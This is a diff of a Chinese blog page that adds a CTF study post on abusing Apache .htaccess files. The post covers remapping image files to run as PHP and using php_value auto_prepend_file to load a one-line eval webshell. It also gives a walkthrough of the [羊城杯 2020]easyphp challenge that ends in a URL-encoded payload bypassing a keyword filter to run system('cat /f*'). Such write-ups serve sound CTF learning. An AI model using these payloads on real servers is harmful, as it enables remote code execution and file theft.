@@ -111,11 +111,20 @@
             <time  class="article-date" datetime="2024-07-23T13:40:19.000Z" itemprop="datePublished">2024-07-23</time>
           </h2>
           
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2024-07-24T01:50:26.047Z" itemprop="dateUpdated">2024-07-24</time>
+            </h2>
+          
           
           <ul class="wrap-list dark">
   
+    <li><a href="/categories/%E5%AD%A6%E4%B9%A0/">📒 学习</a></li>
+    
 </ul>
           <ul class="wrap-list dark">
+  
+    <li><a href="/tags/ctf-htaccess/">🏷️ ctf htaccess</a></li>
   
 </ul>
         </div>
@@ -139,7 +148,62 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        
+        <p>相关的文章为：<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/116666720">https://blog.csdn.net/solitudi/article/details/116666720</a></p>
+<h3 id="htaccess配置文件的基本信息"><a href="#htaccess配置文件的基本信息" class="headerlink" title=".htaccess配置文件的基本信息"></a>.htaccess配置文件的基本信息</h3><p>首先先了解一下有关.htaccess文件是什么，是一个配置文件，用于运行Apache网络服务器软件的网络服务器上，当.htaccess文件被放置在一个 “通过Apache Web服务器加载 “的目录中时，.htaccess文件会被Apache Web服务器软件检测并执行。这些.htaccess文件可以用来改变Apache Web服务器软件的配置，以启用&#x2F;禁用Apache Web服务器软件所提供的额外功能和特性。 简单来说就是用来修改配置的</p>
+<p>然后补充一点就是在.htaccess配置文件中单行注释符为 # </p>
+<p>如果想要在服务器上可以运行.htaccess文件就需要先将主配置文件的AllowOverride 设置为 All</p>
+<h3 id="具体的运用"><a href="#具体的运用" class="headerlink" title="具体的运用"></a>具体的运用</h3><h4 id="通过-htaccess文件来制定出错页面"><a href="#通过-htaccess文件来制定出错页面" class="headerlink" title="通过.htaccess文件来制定出错页面"></a>通过.htaccess文件来制定出错页面</h4><blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument <span class="number">401</span> /error/<span class="number">401</span>.php</span><br><span class="line">ErrorDocument <span class="number">403</span> /error/<span class="number">403</span>.php</span><br><span class="line">ErrorDocument <span class="number">404</span> /error/<span class="number">404</span>.php</span><br><span class="line">ErrorDocument <span class="number">500</span> /error/<span class="number">500</span>.php</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>在ctf比赛题目中就有应用：</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;If <span class="string">&quot;file(&#x27;/flag&#x27;) =~ &#x27;/flag&#123;a/&#x27;&quot;</span>&gt;  <span class="comment">//~ 类似为正则匹对</span></span><br><span class="line">ErrorDocument <span class="number">404</span> <span class="string">&quot;y4tacker&quot;</span></span><br><span class="line">&lt;/If&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>如果在&#x2F;flag中有flag{a 就返回y4tacker，从而来枚举出flag,比较少用</p>
+<h4 id="SetHandler和ForceType"><a href="#SetHandler和ForceType" class="headerlink" title="SetHandler和ForceType"></a>SetHandler和ForceType</h4><p>常见的应用场景 文件上传：</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt;   <span class="comment">//指定将1.jpg通过PHP运行</span></span><br><span class="line">SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">//或者直接全局都直接使用PHP解析</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;Files ~ <span class="string">&quot;\.jpg$&quot;</span>&gt;   <span class="comment">//~先当于正则匹对 将所有匹对到.jpg结尾的都以PHP解析</span></span><br><span class="line"> ForceType application/x-httpd-php  </span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h4><p>作用就是将什么以什么方式解析，作用域是针对整个服务器或特定目录的，而不是针对单个文件的，所以不需要通过Files来进行规定</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php-script .jpg  <span class="comment">//将jpg文件当作PHP脚本</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a><strong>AddType</strong></h4><p>是Apache服务器配置中的一个重要指令，它用于将特定的文件扩展名映射到指定的MIME类型</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .html</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>这条指令告诉Apache服务器，当遇到.html扩展名的文件时，应该将它们视为application&#x2F;x-httpd-php类型的文件，即PHP脚本文件，并由PHP解析器进行处理</p>
+<h4 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h4><p>当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess  文件中的指令来修改 php 的配置设定。需要有AllowOverride Options 或AllowOverride All 权限才可以</p>
+<p>php_value 设定指定的值。要清除先前设定的值，把 value 设为 none。不要用 php_value 设定布尔值。应该用 php_flag</p>
+<p>实际的应用中就有：</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file <span class="number">1</span>.txt <span class="comment">//在主文件解析之前自动解析包含1.txt的内容</span></span><br><span class="line">php_value auto_append_file <span class="number">2</span>.txt <span class="comment">//在主文件解析后自动解析1.txt的内容</span></span><br><span class="line"><span class="comment">//最好是这样，应用#号为注释符，但是PHP可以正常解析来上传一句话木马</span></span><br><span class="line">php_value auto_prepend_file .htaccess <span class="comment">#&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//关于过滤file： 这样也是可以执行命令的</span></span><br><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>还有一种用法，绕过preg_match匹对，将最大的次数改为0即可，就可以用最大回溯(pcre.backtrack_limit)&#x2F;递归限制使php正则失效：</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit <span class="number">1</span>  <span class="comment">//默认为100000</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="具体的例题"><a href="#具体的例题" class="headerlink" title="具体的例题"></a>具体的例题</h3><p>[羊城杯 2020]easyphp</p>
+<p>源码：</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);  </span><br><span class="line"> <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;   <span class="comment">//遍历目录，将不是index.php的文件都删除</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123; </span><br><span class="line">             <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);  </span><br><span class="line">         &#125; </span><br><span class="line">     &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123; <span class="comment">//通过get来提交文件名和内容</span></span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">     <span class="keyword">die</span>(); </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];  <span class="comment">//在文件内容里面过滤关键字</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123; </span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>; </span><br><span class="line">     <span class="keyword">die</span>(); </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];   <span class="comment">//</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123; <span class="comment">//检查文件名是否都由字母和点组成</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>; </span><br><span class="line">     <span class="keyword">die</span>(); </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);  <span class="comment">//再删除一次</span></span><br><span class="line"> <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123; </span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123; </span><br><span class="line">             <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>); </span><br><span class="line">         &#125; </span><br><span class="line">     &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);  <span class="comment">//在后面拼接一段字符串</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>看逻辑应该是在删除后再创建的文件，但是上传一个普通的php文件，发现上传什么都没有用，无论怎么上传，页面都只是显示Hello, world</p>
+<p>这里就可以通过上传.htaccess来修改配置</p>
+<blockquote>
+<p>php_value auto_prepend_file .htaccess<br>#<?php system('cat /f*');?></p>
+</blockquote>
+<p>但是需要有些修改，还有要将后面的\nHello, world继续拼接否则回报错</p>
+<p>这里过滤了file 可以通过变为</p>
+<blockquote>
+<p>php_value auto_prepend_fil<br>e .htaccess<br>#<?php system('cat /f*');?>\</p>
+</blockquote>
+<p>最后再通过url编码上传即可</p>
+<p>最后payload为：</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value%<span class="number">20</span>auto_prepend_fil%<span class="number">5</span>C%<span class="number">0</span>Ae%<span class="number">20</span>.htaccess%<span class="number">0</span>A%<span class="number">23</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system(<span class="string">&#x27;cat%20/f*&#x27;</span>)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">5</span>C</span><br></pre></td></tr></table></figure>
+</blockquote>
+
       </section>
 
       
@@ -201,13 +265,13 @@
         <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
 </svg>
-        1
+        2
       </div>
       <div class="count-box--item">
         <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
 </svg>
-        1
+        2
       </div>
     </div>
   </div>
@@ -245,6 +309,12 @@
           </a>
         </li>
         
+        <li class="categories-list-item">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0/">
+            学习 (1)
+          </a>
+        </li>
+        
     </ul>
   </div>
 </section>
@@ -258,7 +328,7 @@
   </div>
   <div class="widget-body">
     <div class="tags-cloud">
-      <a href="/tags/web-ssti/" style="font-size: 10px;" class="tags-cloud-0">web ssti</a>
+      <a href="/tags/ctf-htaccess/" style="font-size: 10px;" class="tags-cloud-0">ctf htaccess</a> <a href="/tags/web-ssti/" style="font-size: 10px;" class="tags-cloud-0">web ssti</a>
     </div>
   </div>
 </section>
